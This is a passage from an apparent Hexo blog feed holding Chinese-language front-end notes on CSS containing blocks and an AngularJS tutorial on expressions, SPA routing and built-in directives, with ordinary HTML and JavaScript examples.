中。</li></ul></li><li>block formatting context<ul><li>在这种布局方式下，盒子们自所在的 containing block 顶部起一个接一个垂直排列</li><li>水平方向上撑满整个宽度 (除非内部的盒子自己内部建立了新的 BFC)</li></ul></li><li>containing block<ul><li>一般来说，盒子本身就为其子孙建立了 containing block，用来计算内部盒子的位置、大小</li><li>对内部的盒子，具体采用哪个 containing block 来计算，需要分情况来讨论：<ul><li>若此元素为 inline 元素，</li><li>则 containing block 为能够包含这个元素生成的第一个和最后一个 inline box 的 padding box (除 margin, border 外的区域) 的最小矩形；</li><li>否则则由这个祖先元素的 padding box 构成。</li><li>根元素所在的 containing block 被称为 initial containing block，在我们常用的浏览器环境下，指的是原点与 canvas 重合，大小和 viewport 相同的矩形；</li><li>对于 position 为 static 或 relative 的元素，其 containing block 为祖先元素中最近的 block container box 的 content box (除 margin, border, padding 外的区域)；</li><li>对于 position:fixed 的元素，其 containing block 由 viewport 建立；</li><li>对于 position:absolute 的元素，则是先找到其祖先元素中最近的 position 属性非 static 的元素，然后判断：</li><li>如果都找不到，则为 initial containing block。</li></ul></li></ul></li></ul><h2 id="45、b-标签和-strong-标签-i-标签和-em-标签的区别"><a href="#45、b-标签和-strong-标签-i-标签和-em-标签的区别" class="headerlink" title="45、b 标签和 strong 标签, i 标签和 em 标签的区别"></a>45、b 标签和 strong 标签, i 标签和 em 标签的区别</h2><p>后者有语义，前者则无</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、浏览器的内核&quot;&gt;&lt;a href=&quot;#1、浏览器的内核&quot; class=&quot;headerlink&quot; title=&quot;1、浏览器的内核&quot;&gt;&lt;/a&gt;1、浏览器的内核&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;IE: trident内核&lt;br&gt;Firefox：gecko内核&lt;br&gt;Safari:webkit内核&lt;br&gt;Opera:以前是presto内核，Opera现已改用Google Chrome的Blink内核&lt;br&gt;Chrome:Blink(基于webkit，Google与Opera Software共同开发)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;2、Doctype&quot;&gt;&lt;a href=&quot;#2、Doctype&quot; class=&quot;headerlink&quot; title=&quot;2、Doctype&quot;&gt;&lt;/a&gt;2、Doctype&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;!DOCTYPE&amp;gt;&lt;/code&gt; 声明位于文档中的最前面的位置，处于 标签之前。&lt;br&gt;此标签可告知浏览器文档使用哪种 HTML 或 XHTML 规范。&lt;br&gt;重点：告知浏览器该以何种模式来渲染文档&lt;br&gt;DOCTYPE不存在或格式不正确会导致文档以混杂模式呈现。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="CSS" scheme="http://yoursite.com/tags/CSS/"/>
    
      <category term="html" scheme="http://yoursite.com/tags/html/"/>
    
      <category term="HTML" scheme="http://yoursite.com/tags/HTML/"/>
    
      <category term="css" scheme="http://yoursite.com/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>AngularJS 框架</title>
    <link href="http://yoursite.com/2016/03/18/AngularJS%20%E6%A1%86%E6%9E%B6/"/>
    <id>http://yoursite.com/2016/03/18/AngularJS 框架/</id>
    <published>2016-03-17T16:00:00.000Z</published>
    <updated>2018-06-04T06:14:09.731Z</updated>
    
    <content type="html"><![CDATA[<p>写在最前：由于 ng 的表达式和博客有冲突，所以除了代码块之外所有的大括号经过了 \ 转义！</p><h2 id="Angular-介绍"><a href="#Angular-介绍" class="headerlink" title="Angular 介绍"></a>Angular 介绍</h2><h3 id="什么是框架和库"><a href="#什么是框架和库" class="headerlink" title="什么是框架和库"></a>什么是框架和库</h3><p>库是由开发人员主动使用库里面提供的 API，完成代码功能逻辑</p><p>框架里面提供了各种各样的库，这些库可以调用使用，也可以由框架去调用使用</p><h3 id="什么是-AngularJS"><a href="#什么是-AngularJS" class="headerlink" title="什么是 AngularJS"></a>什么是 AngularJS</h3><ul><li>一款非常优秀的前端高级 <strong>JavaScript</strong> 框架</li><li>可以轻松构建 <strong>SPA 应用程序</strong></li><li>通过 <strong>指令</strong> 扩展了 HTML，通过 <strong>表达式</strong> 绑定数据到 HTML</li><li><strong>最大程度上解放了 DOM 操作</strong></li><li>构建更加动感的 HTML 应用程序</li></ul><p>AngularJS是为了克服HTML在构建应用上的不足而设计的。AngularJS有着诸多特性，最为核心的是：</p><ul><li>MVC</li><li>模块化</li><li>自动化双向数据绑定</li><li>语义化标签、依赖注入等等</li></ul><h3 id="为什么使用-Angular"><a href="#为什么使用-Angular" class="headerlink" title="为什么使用 Angular"></a>为什么使用 Angular</h3><a id="more"></a><p>以前我们是这样的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;传统页面操作数据操作方式&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;input id=<span class="string">"txt_value"</span> type=<span class="string">"number"</span>&gt;</span><br><span class="line">  &lt;input id=<span class="string">"btn_add"</span> type=<span class="string">"button"</span> value=<span class="string">"增加"</span>&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> txt = <span class="built_in">document</span>.querySelector(<span class="string">'#txt_value'</span>);</span><br><span class="line">      <span class="keyword">var</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">'#btn_add'</span>);</span><br><span class="line">      btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> now = txt.value - <span class="number">0</span>;</span><br><span class="line">        now = now + <span class="number">1</span>;</span><br><span class="line">        txt.value = now;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p>以后将会是这样的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;使用AngularJS实现自增功能&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body ng-app&gt;</span><br><span class="line">  &lt;input type=<span class="string">"number"</span> ng-model=<span class="string">"value"</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">"button"</span> ng-click=<span class="string">"value=value+1"</span> value=<span class="string">"增加"</span>&gt;</span><br><span class="line">  &lt;script src=<span class="string">"../bower_components/angular/angular.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><h3 id="AngularJS-优缺点"><a href="#AngularJS-优缺点" class="headerlink" title="AngularJS 优缺点"></a>AngularJS 优缺点</h3><p>优点：</p><ol><li>AngularJS 模板功能强大丰富，自带了极其丰富的angular指令。</li><li>AngularJS 是完全可扩展的，与其他库的兼容效果很好，每一个功能可以修改或更换，以满足开发者独特的开发流程和功能的需求。</li><li>AngularJS 是一个比较完善的前端MVC框架，包含服务，模板，数据双向绑定，模块化，路由，过滤器，依赖注入等所有功能；</li><li>AngularJS 是互联网巨人谷歌开发，这也意味着他有一个坚实的基础和社区支持。</li></ol><p>缺点：</p><ol><li>AngularJS 强约束导致学习成本较高，对前端不友好。但遵守 AngularJS 的约定时，生产力会很高，对 后台服务器开发程序员友好。</li><li>AngularJS 不利于 SEO，因为所有内容都是动态获取并渲染生成的，搜索引擎没法爬取。</li><li>AngularJS 作为 MVVM 框架，因为实现了数据的双向绑定，对于大数组、复杂对象会存在性能问题。</li></ol><h3 id="AngularJS-使用场景"><a href="#AngularJS-使用场景" class="headerlink" title="AngularJS 使用场景"></a>AngularJS 使用场景</h3><ul><li>单页面应用程序</li><li>复杂的后台管理系统<ul><li>CRUD（增加 Create、查询 Retrieve、更新 Update、删除 Delete）</li><li>繁杂的 DOM 操作处理的页面</li></ul></li></ul><p>Angular 是一个类 MVC 类结构的 JavaScript 框架，建议构建 CRUD 类型应用的时候使用它，而对于那些图形编辑、游戏开发等应用，使用 Angular 就不如调用其它 JavaScript 类库方便，如 jQuery。</p><h3 id="AngularJS资源"><a href="#AngularJS资源" class="headerlink" title="AngularJS资源"></a>AngularJS资源</h3><ul><li>官方文档：<a href="https://docs.angularjs.org/api" target="_blank" rel="noopener">https://docs.angularjs.org/api</a></li><li>AngularJS 中文社区：<a href="http://angularjs.cn/" target="_blank" rel="noopener">http://angularjs.cn/</a></li></ul><h2 id="SPA-单页面应用程序"><a href="#SPA-单页面应用程序" class="headerlink" title="SPA 单页面应用程序"></a>SPA 单页面应用程序</h2><p>SPA全称：<code>Single Page Application</code>，单页面应用程序。</p><p>所谓的单页应用：其实就是利用 hash 做网页内部局部内容的替换</p><p>(1). 为什么不适用传统的路径？</p><p>原因是传统的路径会默认发同步请求跳转</p><p>(2). 为什么 hash 中的路径都是以 / 开头</p><p>原因是为了区分普通的 hash</p><h3 id="传统的网站模型：多页面应用模型"><a href="#传统的网站模型：多页面应用模型" class="headerlink" title="传统的网站模型：多页面应用模型"></a>传统的网站模型：多页面应用模型</h3><h3 id="SPA-网站模型"><a href="#SPA-网站模型" class="headerlink" title="SPA 网站模型"></a>SPA 网站模型</h3><ul><li>网易云音乐实例解析</li></ul><p>锚点：网页内部定位</p><ul><li><code>id</code></li><li><code>a.name</code></li></ul><h3 id="利用锚点改变网页内容"><a href="#利用锚点改变网页内容" class="headerlink" title="利用锚点改变网页内容"></a>利用锚点改变网页内容</h3><ul><li>window对象的 <code>hashchange</code> 事件</li><li><code>window.location</code> 拿到锚点的内容</li><li>根据不同的 <code>hash</code> 显示不同的内容</li></ul><h3 id="单页应用的好处"><a href="#单页应用的好处" class="headerlink" title="单页应用的好处"></a>单页应用的好处</h3><ul><li>提高了整个应用程序的响应速度、增加了用户体验</li><li>重用资源</li><li>方便统一控制和代码重用</li></ul><h3 id="如何在网页中解析-URL-地址"><a href="#如何在网页中解析-URL-地址" class="headerlink" title="如何在网页中解析 URL 地址"></a>如何在网页中解析 URL 地址</h3><ul><li><a href="http://www.baidu.com/a/b/c?foo=bar&amp;name=jack#/abc" target="_blank" rel="noopener">http://www.baidu.com/a/b/c?foo=bar&amp;name=jack#/abc</a><ul><li>字符串操作</li><li>正则匹配</li><li>a DOM 元素解析</li></ul></li></ul><h2 id="Angular-的应用"><a href="#Angular-的应用" class="headerlink" title="Angular 的应用"></a>Angular 的应用</h2><h3 id="关于版本"><a href="#关于版本" class="headerlink" title="关于版本"></a>关于版本</h3><ul><li><a href="https://angularjs.org/" target="_blank" rel="noopener">Angular 1</a></li><li><a href="https://github.com/angular/angular.js" target="_blank" rel="noopener">Angular 1 - Github</a></li><li><a href="https://angular.io/" target="_blank" rel="noopener">Angular 2</a></li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li>github<ul><li><a href="https://github.com/angular/angular.js/releases" target="_blank" rel="noopener">https://github.com/angular/angular.js/releases</a></li></ul></li><li>CDN<ul><li><a href="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js" target="_blank" rel="noopener">https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js</a></li></ul></li><li>bower<ul><li>bower install angular#1.5.8</li></ul></li><li>npm<ul><li>npm install <a href="mailto:angular@1.5.8" target="_blank" rel="noopener">angular@1.5.8</a></li></ul></li></ul><h3 id="第一个-Angular-程序"><a href="#第一个-Angular-程序" class="headerlink" title="第一个 Angular 程序"></a>第一个 Angular 程序</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;ng - HelloHiraku&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body ng-app ng-init=<span class="string">"name='World'"</span>&gt;</span><br><span class="line">  Name: &lt;input type="text" ng-model="name"&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;h1&gt;Hello &#123;&#123;name&#125;&#125;!&lt;/h1&gt;</span><br><span class="line">  &lt;script src="angular.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h3><ul><li>当网页加载完毕，AngularJS 自动开始执行</li><li>HTML 页面中 <code>ng-xxx</code> 的属性称之为指令（Directive）</li><li><code>ng-app</code> 指令告诉 AngularJS ，<code>&lt;body&gt;</code> 元素是 AngularJS 应用程序管理的边界</li><li><code>ng-init</code> 指令初始化 AngularJS 应用程序变量</li><li><code>ng-model</code> 指令把文本框的 <code>value</code>值绑定到变量 <code>name</code> 上</li><li><code>\{\{ name \}\}</code> 表达式就是把应用程序变量 <code>name</code> 绑定到某个元素的 innerHTML</li></ul><blockquote><p>ng 使用过程</p></blockquote><p>(0). 引包</p><p>(1). 在 body 上添加一个属性：ng-app</p><p>(2). 在 body 中写一个 <code>&lt;h1&gt;\{\{&#39;Hello &#39; + &#39;World!&#39;\}\}&lt;/h1&gt;</code></p><p>解析过程：</p><ol><li>浏览器从上到下依次解析 DOM 文档</li><li>当浏览器解析到 body 上有一个 ng-app 属性的时候，浏览器对于不识别的属性会选择忽略</li><li>当浏览器解析到 <code>&lt;h1&gt;\{\{&#39;Hello &#39; + &#39;World!&#39;\}\}&lt;/h1&gt;</code> ，浏览器无法识别里面的双花括号以及里面的内容，浏览器会把它当成普通的字符串进行渲染</li><li>当浏览西发现 script 标签指定的 angular.js 引用文件的时候，发送请求下载该文件</li><li>当 angular.js 程序下载成功之后，开始自动执行</li><li>ng 自动找到网页中具有 ng-app 属性的元素，然后开始解析该元素内部所有能被 ng 所识别的元素，也就是说 ng-app 在这里就充当了 ng 应用程序启动的入口标识，同时也是 ng 应用程序的管理边界</li><li>ng 找到入口标识之后，开始解析该入口标识中所有的自己能识别的内容</li></ol><p>例如，这里使用了一个 <code>\{\{\}\}</code> 表达式，<code>\{\{\}\}</code> 在 ng 中被称作花括号插值表达式。</p><h2 id="AngularJS-表达式"><a href="#AngularJS-表达式" class="headerlink" title="AngularJS 表达式"></a>AngularJS 表达式</h2><ul><li>AngularJS 表达式写在双大括号内：<code>\{\{ expression \}\}</code></li><li>AngularJS 表达式把数据绑定到 HTML，与 <code>ng-bind</code> 指令基本一致</li><li>AngularJS 将在表达式书写的位置”输出”数据<ul><li>数字</li><li>字符串</li><li>对象</li><li>数组</li></ul></li><li>AngularJS 表达式 很像 JavaScript 表达式：它们可以包含字符串、操作符和变量<ul><li>与 JavaScript 表达式不同，AngularJS 表达式可以写在 HTML 中</li><li>与 JavaScript 表达式不同，AngularJS 表达式不支持条件判断，循环及异常</li><li>与 JavaScript 表达式不同，AngularJS 表达式支持过滤器</li><li>在AngularJS中，表达式是一种类似于模板引擎的语，可以在书写的位置 “输出” 数据。</li></ul></li></ul><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><ul><li>表达式写在双大括号内：<code>\{\{ expression \}\}</code></li><li>表达式 很像 JavaScript 表达式</li><li>它们可以包含文字、运算符和变量</li><li>如 <code>\{\{ 5 + 5 \}\}</code> 或 <code>\{\{ firstName + lastName \}\}</code></li></ul><h3 id="支持的类型及操作符"><a href="#支持的类型及操作符" class="headerlink" title="支持的类型及操作符"></a>支持的类型及操作符</h3><ul><li>数字</li><li>字符串</li><li>对象</li><li>数组</li><li><code>- * /</code></li><li>三目表达式</li><li>短路运算符</li></ul><p>如果是 null 或 undefined ，表达式不会报错。</p><h3 id="Angular-表达式与-JavaScript-区别："><a href="#Angular-表达式与-JavaScript-区别：" class="headerlink" title="Angular 表达式与 JavaScript 区别："></a>Angular 表达式与 JavaScript 区别：</h3><p>相同点：</p><p>都可以包含字母、操作符、变量</p><p>不同点：</p><ul><li>AngularJS 表达式可以写在 HTML 中</li><li>AngularJS 表达式不支持条件判断，循环及异常</li><li>AngularJS 表达式支持过滤器</li></ul><h3 id="解决表达式闪烁的问题"><a href="#解决表达式闪烁的问题" class="headerlink" title="解决表达式闪烁的问题"></a>解决表达式闪烁的问题</h3><p>ng 默认是在 document onload 的时候开始解析执行，ng 在启动执行的时候会自动向 head 中插入一个 style 样式。</p><ul><li>ng-cloak</li><li>ng-bind</li></ul><blockquote><p>详细说明：</p></blockquote><p>解决表达式闪烁方式有两种：</p><p>第一种方式：</p><blockquote><p>将 ng 脚本引入到 head 中，ng 官方推荐将 ng 脚本引入最上面；<br>在所有使用了表达式的外部的节点上加一个属性 ng-cloak；<br>当加上 ng-cloak 属性的时候，ng 不会等待 DOM onload 执行结束就会先在加了 ng-cloak 的地方作用一个样式 display: none !important；<br>当 ng 解析完毕之后，ng-cloak（样式） 被自动移除。</p></blockquote><p>第二种方式：</p><blockquote><p>在所有使用表达式的地方都通过 ng-bind 指令来代替；<br>也就是说使用了 ng-bind 可以完全替代表达式；<br>用了它就可以解决将 ng脚本引入底部也不闪烁的问题。</p></blockquote><h2 id="AngularJS-指令"><a href="#AngularJS-指令" class="headerlink" title="AngularJS 指令"></a>AngularJS 指令</h2><p>AngularJS 指令是以 <code>ng-</code> 作为前缀的 HTML 属性，AngularJS 通过内置的指令来为应用添加功能，AngularJS 同时允许自定义指令，从而构建更加超动感的 HTML。</p><p>HTML5 允许扩展的（自制的）属性，以 <code>data-</code> 开头。AngularJS 属性以 ng- 开头，但是也可以使用 <code>data-ng-</code> 来让网页对 HTML5 有效。</p><h2 id="指令的使用形式"><a href="#指令的使用形式" class="headerlink" title="指令的使用形式"></a>指令的使用形式</h2><ul><li>ng-xxx 的属性本身并不是标准中定义的属性</li><li>很多情况下无法通过语法校验</li><li>HTML5 允许扩展的属性，以 <code>data-</code> 开头</li><li>在 ng 中可以使用 <code>data-ng-</code> 作为前缀来让网页对 HTML5 有效<br>二者效果相同</li></ul><h3 id="内置指令"><a href="#内置指令" class="headerlink" title="内置指令"></a>内置指令</h3><p>AngularJS 内置了很多指令，用来增强 HTML，以下是一些常用内置指令的介绍。</p><h4 id="ngApp"><a href="#ngApp" class="headerlink" title="ngApp"></a>ngApp</h4><ul><li>ng-app</li></ul><h4 id="ngController"><a href="#ngController" class="headerlink" title="ngController"></a>ngController</h4><h4 id="ngInit"><a href="#ngInit" class="headerlink" title="ngInit"></a>ngInit</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;ng - 双向绑定&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body ng-app ng-init=<span class="string">"name='World'"</span>&gt;</span><br><span class="line">  &lt;!-- input 的 value 和模型中的 name 建立双向绑定关系 --&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> ng-model=<span class="string">"name"</span>&gt;</span><br><span class="line">  &lt;!-- </span><br><span class="line">    input 的 value 和模型中的 age 建立双向绑定关系 </span><br><span class="line">    age 不一定初始化，可以直接使用，当你直接使用的时候，会自动去模型中初始化 age，只不过没有值而已</span><br><span class="line">    如果想要给 age 初始化数据，就可以通过 ng-init 的方式，给 age 初始化一个值</span><br><span class="line">    ng-init 以后也会很少适应，这里是为了案例演示</span><br><span class="line">    --&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> ng-model=<span class="string">"age"</span>&gt;</span><br><span class="line">  &lt;h1&gt;Hello &#123;&#123;name&#125;&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">  &lt;h1&gt;年龄 &#123;&#123;age&#125;&#125;&lt;/</span>h1&gt;</span><br><span class="line">  &lt;script src=<span class="string">"js/angular.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><h4 id="ngBind"><a href="#ngBind" class="headerlink" title="ngBind"></a>ngBind</h4><ul><li>ng-bind</li><li>ng-non-bindable</li></ul><h4 id="ngBindHtml"><a href="#ngBindHtml" class="headerlink" title="ngBindHtml"></a>ngBindHtml</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;body ng-app=<span class="string">"DemoApp"</span> ng-controller=<span class="string">"DemoController"</span>&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1 ng-bind=<span class="string">"title"</span>&gt;&lt;/h1&gt;</span><br><span class="line">    &lt;div ng-bind-html=<span class="string">"content"</span>&gt;&lt;/div&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script src="js/</span>angular.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;script src="</span>../node_modules/angular-sanitize/angular-sanitize.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;script&gt;</span></span><br><span class="line"><span class="string">    // 如果想要绑定 HTML 字符串，则必须使用这种方式</span></span><br><span class="line"><span class="string">    //    1. npm install --save angular-sanitize</span></span><br><span class="line"><span class="string">    //    2. 在使用该字符串的所属的模块中加载 ngSanitize 模块即可生效</span></span><br><span class="line"><span class="string">    angular.module('DemoApp', ['ngSanitize']).controller('DemoController', ['$scope', function ($scope) &#123;</span></span><br><span class="line"><span class="string">      $scope.title = '使用ngSanitize 模块绑定 HTML 字符串'</span></span><br><span class="line"><span class="string">      $scope.content = '&lt;script&gt;window.alert("</span>hello<span class="string">")&lt;\/script&gt;&lt;p&gt;作者：xxx&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Hiraku&lt;/strong&gt;如何绑定&lt;/p&gt;'</span></span><br><span class="line"><span class="string">    &#125;]);</span></span><br><span class="line"><span class="string">  &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ngRepeat"><a href="#ngRepeat" class="headerlink" title="ngRepeat"></a>ngRepeat</h4><ul><li>ng-repeat</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;body ng-app=<span class="string">"DemoApp"</span> ng-controller=<span class="string">"DemoController"</span>&gt;</span><br><span class="line">  &lt;table&gt;</span><br><span class="line">    &lt;thead&gt;</span><br><span class="line">      &lt;tr&gt;&lt;th&gt;编号&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;年龄&lt;/th&gt;&lt;th&gt;性别&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">    &lt;<span class="regexp">/thead&gt;</span></span><br><span class="line"><span class="regexp">    &lt;tbody&gt;</span></span><br><span class="line"><span class="regexp">      &lt;tr ng-repeat="friend in friends"&gt;&lt;td&gt;&#123;&#123;$index+1&#125;&#125;&lt;/</span>td&gt;&lt;td&gt;&#123;&#123;friend.name&#125;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#123;friend.age&#125;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#123;friend.gender&#125;&#125;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">    &lt;<span class="regexp">/tbody&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>table&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;!-- 利用 track by $index 解决重复项报错问题 --&gt;</span><br><span class="line">    &lt;li ng-repeat=<span class="string">"fruit in fruits track by $index"</span>&gt;&#123;&#123;fruit&#125;&#125;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/u</span>l&gt;</span><br><span class="line">  &lt;script src=<span class="string">"../code/js/angular.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    angular.module(<span class="string">'DemoApp'</span>, []).controller(<span class="string">'DemoController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">      <span class="comment">/* beautify ignore:start */</span></span><br><span class="line">      $scope.friends = [&#123;<span class="attr">name</span>:<span class="string">'John'</span>, <span class="attr">age</span>:<span class="number">25</span>, <span class="attr">gender</span>:<span class="string">'boy'</span>&#125;,&#123;<span class="attr">name</span>:<span class="string">'John'</span>, <span class="attr">age</span>:<span class="number">25</span>, <span class="attr">gender</span>:<span class="string">'boy'</span>&#125;, &#123;<span class="attr">name</span>:<span class="string">'Jessie'</span>, <span class="attr">age</span>:<span class="number">30</span>, <span class="attr">gender</span>:<span class="string">'girl'</span>&#125;];</span><br><span class="line">      <span class="comment">// ng-repeat 在遍历普通数据类型的时候，如果有相同的值，会报错；在使用 ng-repeat 的时候，都最好加上 track by $index 来避免这个问题</span></span><br><span class="line">      $scope.fruits = [<span class="string">'🍎'</span>,<span class="string">'🍎'</span>, <span class="string">'🍌'</span>, <span class="string">'🍐'</span>, <span class="string">'🍉'</span>];</span><br><span class="line">      <span class="comment">/* beautify ignore:end */</span></span><br><span class="line">    &#125;]);</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure><h4 id="解决重复项报错问题"><a href="#解决重复项报错问题" class="headerlink" title="解决重复项报错问题"></a>解决重复项报错问题</h4><h4 id="ngClass"><a href="#ngClass" class="headerlink" title="ngClass"></a>ngClass</h4><ul><li>ng-class</li><li>ng-class-even</li><li>ng-class-odd</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;body 